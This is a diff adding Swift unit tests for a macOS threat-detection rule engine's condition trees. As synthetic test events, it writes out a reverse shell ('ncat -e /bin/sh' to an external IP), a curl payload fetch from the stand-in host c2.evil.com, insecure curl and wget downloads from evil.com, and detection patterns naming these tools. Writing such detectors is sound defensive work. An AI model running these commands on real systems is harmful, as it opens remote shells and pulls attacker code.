@@ -855,6 +855,206 @@ struct RuleEngineTests {
         #expect(noMatches.isEmpty)
     }
 
+    // MARK: - Condition Tree Tests
+
+    @Test("Condition tree: AND with NOT filters (e.g., selection and not filter)")
+    func conditionTreeAndNot() async throws {
+        // Rule: match curl AND NOT connecting to port 443
+        let rule = CompiledRule(
+            id: "tree-and-not",
+            title: "Curl on unusual port",
+            description: "Test",
+            level: .medium,
+            tags: [],
+            logsource: LogSource(category: "network_connection", product: "macos"),
+            predicates: [
+                // [0] selection: process is curl
+                Predicate(field: "Image", modifier: .endswith, values: ["/curl"], negate: false),
+                // [1] filter: destination port 443
+                Predicate(field: "DestinationPort", modifier: .equals, values: ["443"], negate: false),
+            ],
+            condition: .allOf, // legacy fallback
+            conditionTree: .and([
+                .predicate(0),
+                .not(.predicate(1)),
+            ]),
+            falsepositives: [],
+            enabled: true
+        )
+
+        let engine = try await loadSingleRule(rule)
+
+        // curl on port 8080 — should match (curl AND NOT port 443)
+        let net8080 = NetworkInfo(sourceIp: "0.0.0.0", sourcePort: 0, destinationIp: "1.2.3.4", destinationPort: 8080, direction: .outbound, transport: "tcp")
+        let event1 = makeEvent(category: .network, type: .connection, action: "connect", processName: "curl", processPath: "/usr/bin/curl", network: net8080)
+        let matches1 = await engine.evaluate(event1)
+        #expect(matches1.count == 1, "Should match curl on port 8080")
+
+        // curl on port 443 — should NOT match (NOT filter blocks it)
+        let net443 = NetworkInfo(sourceIp: "0.0.0.0", sourcePort: 0, destinationIp: "1.2.3.4", destinationPort: 443, direction: .outbound, transport: "tcp")
+        let event2 = makeEvent(category: .network, type: .connection, action: "connect", processName: "curl", processPath: "/usr/bin/curl", network: net443)
+        let matches2 = await engine.evaluate(event2)
+        #expect(matches2.isEmpty, "Should NOT match curl on port 443 (filtered)")
+
+        // wget on port 8080 — should NOT match (not curl)
+        let event3 = makeEvent(category: .network, type: .connection, action: "connect", processName: "wget", processPath: "/usr/bin/wget", network: net8080)
+        let matches3 = await engine.evaluate(event3)
+        #expect(matches3.isEmpty, "Should NOT match wget")
+    }
+
+    @Test("Condition tree: OR of AND branches")
+    func conditionTreeOrOfAnd() async throws {
+        // Rule: (curl AND --insecure) OR (wget AND --no-check)
+        let rule = CompiledRule(
+            id: "tree-or-and",
+            title: "Insecure download",
+            description: "Test",
+            level: .high,
+            tags: [],
+            logsource: LogSource(category: "process_creation", product: "macos"),
+            predicates: [
+                // [0] curl
+                Predicate(field: "Image", modifier: .endswith, values: ["/curl"], negate: false),
+                // [1] --insecure flag
+                Predicate(field: "CommandLine", modifier: .contains, values: ["--insecure"], negate: false),
+                // [2] wget
+                Predicate(field: "Image", modifier: .endswith, values: ["/wget"], negate: false),
+                // [3] --no-check flag
+                Predicate(field: "CommandLine", modifier: .contains, values: ["--no-check"], negate: false),
+            ],
+            condition: .anyOf, // legacy fallback
+            conditionTree: .or([
+                .and([.predicate(0), .predicate(1)]),
+                .and([.predicate(2), .predicate(3)]),
+            ]),
+            falsepositives: [],
+            enabled: true
+        )
+
+        let engine = try await loadSingleRule(rule)
+
+        // curl --insecure — should match first branch
+        let e1 = makeEvent(processName: "curl", processPath: "/usr/bin/curl", commandLine: "curl --insecure https://evil.com")
+        #expect(await engine.evaluate(e1).count == 1)
+
+        // wget --no-check — should match second branch
+        let e2 = makeEvent(processName: "wget", processPath: "/usr/bin/wget", commandLine: "wget --no-check-certificate https://evil.com")
+        #expect(await engine.evaluate(e2).count == 1)
+
+        // curl without --insecure — should NOT match
+        let e3 = makeEvent(processName: "curl", processPath: "/usr/bin/curl", commandLine: "curl https://safe.com")
+        #expect(await engine.evaluate(e3).isEmpty)
+
+        // wget without --no-check — should NOT match
+        let e4 = makeEvent(processName: "wget", processPath: "/usr/bin/wget", commandLine: "wget https://safe.com")
+        #expect(await engine.evaluate(e4).isEmpty)
+    }
+
+    @Test("Condition tree: (A and B and not C) or D pattern")
+    func conditionTreeComplexOrPattern() async throws {
+        // Simulates: (selection_process and selection_external and not filter) or ioc
+        let rule = CompiledRule(
+            id: "tree-complex-or",
+            title: "Complex OR pattern",
+            description: "Test",
+            level: .high,
+            tags: [],
+            logsource: LogSource(category: "process_creation", product: "macos"),
+            predicates: [
+                // [0] selection: suspicious process
+                Predicate(field: "Image", modifier: .endswith, values: ["/ncat"], negate: false),
+                // [1] selection: has network flag
+                Predicate(field: "CommandLine", modifier: .contains, values: ["-e"], negate: false),
+                // [2] filter: connecting to localhost (benign)
+                Predicate(field: "CommandLine", modifier: .contains, values: ["127.0.0.1"], negate: false),
+                // [3] ioc: known malicious command
+                Predicate(field: "CommandLine", modifier: .contains, values: ["c2.evil.com"], negate: false),
+            ],
+            condition: .anyOf,
+            conditionTree: .or([
+                .and([
+                    .predicate(0),
+                    .predicate(1),
+                    .not(.predicate(2)),
+                ]),
+                .predicate(3),
+            ]),
+            falsepositives: [],
+            enabled: true
+        )
+
+        let engine = try await loadSingleRule(rule)
+
+        // ncat -e to external host — matches first branch
+        let e1 = makeEvent(processPath: "/usr/bin/ncat", commandLine: "ncat -e /bin/sh 1.2.3.4 4444")
+        #expect(await engine.evaluate(e1).count == 1)
+
+        // ncat -e to localhost — filtered out (NOT 127.0.0.1 fails)
+        let e2 = makeEvent(processPath: "/usr/bin/ncat", commandLine: "ncat -e /bin/sh 127.0.0.1 4444")
+        #expect(await engine.evaluate(e2).isEmpty)
+
+        // Any process mentioning c2.evil.com — matches IOC branch
+        let e3 = makeEvent(processPath: "/usr/bin/curl", commandLine: "curl https://c2.evil.com/payload")
+        #expect(await engine.evaluate(e3).count == 1)
+
+        // Random benign process — no match
+        let e4 = makeEvent(processPath: "/usr/bin/ls", commandLine: "ls -la")
+        #expect(await engine.evaluate(e4).isEmpty)
+    }
+
+    @Test("Condition tree: predicate group with range")
+    func conditionTreePredicateGroup() async throws {
+        // Rule with a group: predicates 0-1 are a selection (all_of), predicate 2 is a filter
+        let rule = CompiledRule(
+            id: "tree-group",
+            title: "Group test",
+            description: "Test",
+            level: .low,
+            tags: [],
+            logsource: LogSource(category: "process_creation", product: "macos"),
+            predicates: [
+                // [0] part of selection group
+                Predicate(field: "Image", modifier: .endswith, values: ["/python3"], negate: false),
+                // [1] part of selection group
+                Predicate(field: "CommandLine", modifier: .contains, values: ["-c"], negate: false),
+                // [2] filter
+                Predicate(field: "CommandLine", modifier: .contains, values: ["pip"], negate: false),
+            ],
+            condition: .allOf,
+            conditionTree: .and([
+                .predicateGroup(range: 0..<2, mode: .allOf),
+                .not(.predicate(2)),
+            ]),
+            falsepositives: [],
+            enabled: true
+        )
+
+        let engine = try await loadSingleRule(rule)
+
+        // python3 -c "import os" — should match (selection group AND NOT pip)
+        let e1 = makeEvent(processPath: "/usr/bin/python3", commandLine: "python3 -c 'import os; os.system(\"id\")'")
+        #expect(await engine.evaluate(e1).count == 1)
+
+        // python3 -c pip install — should NOT match (filter blocks)
+        let e2 = makeEvent(processPath: "/usr/bin/python3", commandLine: "python3 -c 'pip install requests'")
+        #expect(await engine.evaluate(e2).isEmpty)
+    }
+
+    @Test("Condition tree loaded from compiled rules")
+    func loadCompiledRulesWithTrees() async throws {
+        let compiledDir = "/tmp/hawkeye_compiled_v2"
+        guard FileManager.default.fileExists(atPath: compiledDir) else { return }
+
+        let engine = RuleEngine()
+        let count = try await engine.loadRules(from: URL(fileURLWithPath: compiledDir))
+        #expect(count > 100, "Expected 100+ compiled rules, got \(count)")
+
+        // Verify rules with condition trees loaded correctly
+        let rules = await engine.listRules(category: nil)
+        let treesCount = rules.filter { $0.conditionTree != nil }.count
+        #expect(treesCount > 10, "Expected 10+ rules with condition trees, got \(treesCount)")
+    }
+
     @Test("Loads real compiled rules from the compiler output")
     func loadCompiledRules() async throws {
         let compiledDir = "/tmp/hawkeye_compiled_rules"
